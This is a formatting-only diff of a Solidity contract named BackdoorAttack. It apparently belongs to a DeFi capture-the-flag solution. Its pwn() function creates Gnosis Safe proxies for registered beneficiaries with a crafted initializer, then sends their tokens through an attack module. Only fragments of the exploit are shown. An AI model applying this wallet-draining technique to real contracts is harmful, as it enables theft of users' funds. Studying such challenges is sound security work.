@@ -54,7 +54,7 @@ contract BackdoorAttack {
     }
 
     function pwn() external {
-        for (uint256 i = 0; i < beneficiaries.length; ) {
+        for (uint256 i = 0; i < beneficiaries.length;) {
             address[] memory beneficiaries_ = new address[](1);
             beneficiaries_[0] = beneficiaries[i];
 
@@ -76,12 +76,8 @@ contract BackdoorAttack {
                 address(0)
             );
 
-            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
-                address(masterCopy),
-                initializer,
-                1,
-                walletRegistry
-            );
+            GnosisSafeProxy proxy =
+                proxyFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);
 
             attackModule.sendTokens(address(proxy));
 
